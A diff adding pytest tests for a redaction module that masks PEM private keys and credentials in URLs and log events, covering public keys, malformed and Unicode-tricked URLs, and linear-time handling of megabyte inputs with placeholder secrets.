+        pytest.param(f"-----BEGIN RSA PUBLIC KEY-----\n{_KEY_BODY}\n-----END RSA PUBLIC KEY-----", id="rsa-public-key"),
+        pytest.param(
+            f"-----BEGIN PGP PUBLIC KEY BLOCK-----\n{_KEY_BODY}\n-----END PGP PUBLIC KEY BLOCK-----",
+            id="pgp-public-key",
+        ),
+        pytest.param("Store the private key in the vault, never in the repository.", id="prose"),
+    ],
+)
+def test_public_pem_material_and_prose_about_private_keys_are_left_alone(text: str) -> None:
+    """Only a private key's BEGIN line starts the rule, so certificates, public keys, and prose stay."""
+    assert redact_sensitive_text(text) == text
+
+
+@pytest.mark.parametrize(
+    "tail",
+    [
+        pytest.param(_KEY_BODY + "\n", id="long-body"),
+        pytest.param("-----END EC PRIVATE KEY-----\n", id="many-mismatched-end-lines"),
+    ],
+)
+def test_an_unclosed_megabyte_pem_private_key_is_redacted_in_linear_time(tail: str) -> None:
+    """Finding the end of a key that never closes must not rescan the text, as in a 1 MB tool result."""
+    text = "Before.\n-----BEGIN RSA PRIVATE KEY-----\n" + tail * (1_000_000 // len(tail))
+    with cpu_budget(1.0):
+        redacted = redact_sensitive_data({"content": text})
+
+    assert redacted == {"content": f"Before.\n{REDACTED}"}
+
+
+def test_many_pem_markers_in_a_megabyte_are_scanned_in_linear_time() -> None:
+    """Many BEGIN lines that name no private key, and many closed keys, must each cost only their own length."""
+    certificate = "-----BEGIN CERTIFICATE-----\n"
+    key = "-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----\n"
+    certificates = certificate * (500_000 // len(certificate))
+    key_count = 500_000 // len(key)
+    with cpu_budget(1.0):
+        redacted = redact_sensitive_data({"content": f"A private key follows.\n{certificates}{key * key_count}"})
+
+    assert redacted == {"content": f"A private key follows.\n{certificates}{(REDACTED + chr(10)) * key_count}"}
+
+
+@pytest.mark.parametrize(
+    ("url", "redacted"),
+    [
+        ("https://user:password@example.com/repo.git", "https://***@example.com/repo.git"),
+        ("https://ghp_secret:x-oauth-basic@example.com/repo.git", "https://***@example.com/repo.git"),
+        ("https://username@example.com/repo.git", "https://***@example.com/repo.git"),
+        ("ssh://git@example.com/repo.git", "ssh://***@example.com/repo.git"),
+        ("ssh://user:pass@example.com/repo.git", "ssh://***@example.com/repo.git"),
+        ("git+https://user:pass@example.com/repo.git", "git+https://***@example.com/repo.git"),
+        ("https://example.com/repo.git?token=secret#frag-secret", "https://example.com/repo.git"),
+        (
+            "https://user:password@example.com/org/repo.git;token=secret?query=secret#frag-secret",
+            "https://***@example.com/org/repo.git",
+        ),
+        ("http://127.0.0.1:8188/view?filename=cat.png#preview", "http://127.0.0.1:8188/view"),
+        ("http://[::1]:9000/bucket/cat.png?X-Amz-Signature=abc", "http://[::1]:9000/bucket/cat.png"),
+        ("https://media.example/a;session=abc/cat.png;v=1", "https://media.example/a"),
+        ("https://user:hunter2\uff20example.com/repo.git", "***"),
+        ("https://exa\uff1aple.com/repo.git", "***"),
+        ("relative/path?token=abc", "relative/path?token=abc"),
+    ],
+    ids=[
+        "password",
+        "token-username",
+        "username",
+        "ssh-username",
+        "ssh-password",
+        "compound-scheme",
+        "query-and-fragment",
+        "path-parameters-query-and-fragment",
+        "port",
+        "ipv6",
+        "path-parameters",
+        "unparseable",
+        "unparseable-without-userinfo",
+        "no-scheme",
+    ],
+)
+def test_a_redacted_url_keeps_its_scheme_host_port_and_path(url: str, redacted: str) -> None:
+    """Userinfo is masked, path parameters, query, and fragment go, and an unparseable URL goes whole.
+
+    A value without a scheme or host is kept.
+    """
+    assert redact_url_credentials(url) == redacted
+
+
+# Text the parser rejects as a URL that holds no userinfo: a sentence running on from a host without a path, and an at
+# sign after the host.
+_REJECTED_WITHOUT_USERINFO = {
+    "chinese-question-mark": "请看https://github.com，里面有详细说明。你觉得怎么样？",  # noqa: RUF001
+    "chinese-colon": "我在https://example.com上找到了答案：用这个方法就行。",  # noqa: RUF001
+    "japanese-colon": "公式サイトhttps://example.jpを参照してください。質問：",  # noqa: RUF001
+    "at-sign-in-path": "我看https://example.com：见/docs@v2说明",  # noqa: RUF001
+    "at-sign-in-query": "我看https://example.com：见?ref=a@b说明",  # noqa: RUF001
+    "at-sign-in-fragment": "我看https://example.com：见#a@b说明",  # noqa: RUF001
+}
+
+
+@pytest.mark.parametrize("text", list(_REJECTED_WITHOUT_USERINFO.values()), ids=list(_REJECTED_WITHOUT_USERINFO))
+def test_text_the_parser_rejects_as_a_url_stays_unless_it_could_hide_userinfo(text: str) -> None:
+    """A URL in running text reaches the next ASCII space, so the sentence after a bare host stays as it was."""
+    assert redact_sensitive_text(text) == text
+
+
+@pytest.mark.parametrize(
+    ("text", "redacted"),
+    [
+        ("fatal: https://user:hunter2\uff20example.com/repo.git failed", "fatal: *** failed"),
+        ("connect postgresql://user:pw@[::1/db now", "connect *** now"),
+    ],
+    ids=["fullwidth-at", "unbalanced-ipv6-userinfo"],
+)
+def test_a_url_the_parser_rejects_goes_whole_when_it_could_hide_userinfo(text: str, redacted: str) -> None:
+    """An at sign before the host, once NFKC-normalised, may end a password, so the whole URL goes."""
+    assert redact_sensitive_text(text) == redacted
+
+
+def test_the_log_redactor_hides_a_url_the_parser_rejects_whole() -> None:
+    """A fullwidth at sign (U+FF20) before the host makes the parse fail, which must not let the password through."""
+    url = "https://user:hunter2\uff20example.com/repo.git"
+
+    redacted = redact_log_event(None, "warning", {"event": "git_failed", "url": url, "error": f"cannot reach '{url}'"})
+
+    assert redacted == {"event": "git_failed", "url": "***", "error": "cannot reach '***'"}
